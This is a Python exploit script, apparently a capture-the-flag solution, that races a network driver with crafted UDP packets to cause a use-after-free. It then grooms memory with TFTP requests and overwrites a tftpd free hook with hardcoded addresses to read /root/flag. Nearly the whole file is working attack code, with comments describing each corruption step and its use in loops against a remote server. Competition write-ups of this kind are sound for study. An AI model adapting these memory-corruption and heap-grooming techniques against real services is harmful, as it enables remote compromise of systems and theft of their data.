import os
import sys
import time
import struct
import socket

PACKET_HEADER_LEN = 42

global host
global port

# This exploit only works every so often. I've seen it work both locally
# and remotely. During the game I had two private servers in different
# geographic locations (nyc and bangalore) running this exploit in a loop
# against the remote game server. Each server had 8 workers running, throwing
# this exploit. In general, one of these workers was able to get the flag
# every 5 minutes

p64 = lambda x: struct.pack("<Q", x)

def sst(s, n):
    if (n < PACKET_HEADER_LEN):
        n = PACKET_HEADER_LEN + 1
    s.sendto(b"A" * (n - PACKET_HEADER_LEN), (host, port))

def poc(argv):
    global host
    global port
    host = argv[1]

    t = None
    if host != "localhost":
        t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        t.connect((host, argv[2]))

        intro = t.recv(1024)
        got_port = int(intro.split(b'port ')[1].split(b'.\n')[0])
        print("Got port %d" % got_port)
        port = got_port
        t.settimeout(3.0)            

    else:
        if (len(argv) > 2):
            port = int(argv[2])
        else:
            port = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # for good measure, wait for the remote machine to boot
    time.sleep(5)

    sst(s, 1)
    # first expansion
    for _ in range(31):
        sst(s, 192 * 2)
        
    # sleep a bit to let other packets trickle onto the remote stack
    time.sleep(2)

    # expand odds
    for _ in range(32):
        sst(s, 192 * 2)

    time.sleep(2)

    # expand all descriptors
    sst(s, 1)
    for _ in range(31):
        sst(s, 192 * 3)

    time.sleep(2)
    for _ in range(32):
        sst(s, 192 * 3)

    time.sleep(2)
    sst(s, 1)
    for _ in range(31):
        sst(s, 192 * 4)

    time.sleep(2)
    for _ in range(32):
        sst(s, 192 * 4)

    time.sleep(2)

    # Next, go into the infinite loop
    #-----------------------

    for _ in range(31):
        s.sendto(b"A" * ((192 * 5) - PACKET_HEADER_LEN), (host, port))

    # race the driver with the device to cause an infinite construction loop
    print("Going")
    for _ in range (5):
        # now race in to shrink!
        s.sendto(b"1", (host, port))
        s.sendto(b"2", (host, port))
        # this should overwrite the first enlarged descriptor
        s.sendto(b"3", (host, 5555))

        for _ in range(31):
            s.sendto(b"A" * ((192 * 5) - PACKET_HEADER_LEN), (host, port))


    # #-----------------------

    time.sleep(2)
    print("should be stuck now..")
    time.sleep(3)

    print("still going baby")
    # insert the EOP.. now one of the descriptors should
    # have a descriptor len that is too large (768 is what we're
    # going for, as it's ~700 bytes between the beginning of an
    # 192 byte skb's data and the shared info)
    sst(s, 81)

    time.sleep(1)
    # now attempt the overflow setting the skb shinfo's dataref
    # this will cause the cloned skb to free its shared ->data
    # region after being consumed by linux's tcp/ip stack, the
    # result should be a descriptor now pointing to free'd kmalloc
    # (non cache-type'd) memory
    for i in range(2, 60):
        # s.sendto(b"A" * (702 - PACKET_HEADER_LEN) + b"BBBB" + (b"\x00" * 62),
        #          (host, port))
        #s.sendto(bytes([i]) * (768 - PACKET_HEADER_LEN), (host, port))
        s.sendto(b"\x00" * ((768 - PACKET_HEADER_LEN) - 1), (host, port))
    time.sleep(1)

    # create a new socket to avoid having to drain all the TFTP
    # error responses we've probably accumulated
    newsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # this number seems to work well
    putRequests = 26
    
    # start doing our TFTP noise
    # calculated to produce an iovec of the right size
    windowSize = 36
    blockSize = 256


    # send in a bunch of PUT requests to get readIov to allocate the iovecs
    # one of these iovecs should wind up in the memory refered to by our
    # desccriptor. see import_iovec_from_user
    for i in range(putRequests):
        p  = b''
        p += struct.pack(">H", 2)
        p += b"BOOT.bin" + bytes(str(i), 'utf-8') + b"\0"
        p += b"netascii\0"
        p += b"windowsize\0"
        p += bytes(str(windowSize), 'utf-8') + b"\0"
        p += b"blksize\0"
        p += bytes(str(blockSize), 'utf-8') + b"\0"

        #print(len(p) + PACKET_HEADER_LEN)
        newsock.sendto(p, (host, port))

    time.sleep(4)

    # collect the responses to know what ip/port combination we need to write
    # over the allocated iovec
    newsock.settimeout(1)
    channels = [ ]
    try:
        for _ in range(putRequests):
            resp, c = newsock.recvfrom(514)
            print(resp)
            channels.append(c)
    except socket.timeout:
        print("timed waiting for UDP responses")

    print("found %d channels which may have our UAF"%len(channels))

    print(channels)

    # give up if something broke, this can happen a lot :( just try again
    if (len(channels) == 0):
        if not t is None:
            t.close()
        return

    # this can be used for alignment, but i also saw it stop my fragment groom once!
    sst(s, 82)
    sst(s, 83)
    sst(s, 84)
    sst(s, 85)
    time.sleep(1)

    # okay, get ready to overwrite tftpd's free hook with handleRrq and
    # the global request path with /root/flag
    handleRrq = 0x4028ac
    freeHookAddr = 0x4c6d58
    gRequestFileNameAddr = 0x4c7a40

    # need to pad this out so that our this spills over into another descriptor
    # and we overwrite our iovecs with our address chain and NOT the ip header
    pl  = b"A" * (768 - PACKET_HEADER_LEN)
    ow  = p64(gRequestFileNameAddr)
    ow += p64(12)
    ow += p64(freeHookAddr)
    ow += p64(8)
    #ow *= int((192 *2) / 16)
    print(len(ow) + PACKET_HEADER_LEN)

    # need to make sure we get this over the old descriptor, and don't
    # race the driver this time
    for i in range(int(72/2)):
        s.sendto(pl + ow, (host, port))
        if (i % 16 == 0):
            print("Sleeping...")
            time.sleep(0.5)

    # now overwrite with /root/flag\x00\x00 and handleRrq address
    # things should be set up, write to the channels to trigger the writes in tftpd
    for c in channels:
        newsock.sendto(b"/root/flag\x00\x00" + p64(handleRrq), c)
        #newsock.sendto(b"AB" * int(92/2), c)

    time.sleep(3)
    print("Trying for flag...\n")
    try:
        while True:
            resp, _ = newsock.recvfrom(514)
            if b"OOO{" in resp:
                print(time.ctime() + " OOO{" + resp.split(b"OOO{")[1].decode('utf-8'))

    except socket.timeout:
        print("Done trying...\n")

    if not t is None:
        t.close()

def main(argc, argv):
    if argc > 1:
        poc(argv)


if __name__ == '__main__':
    main(len(sys.argv), sys.argv)
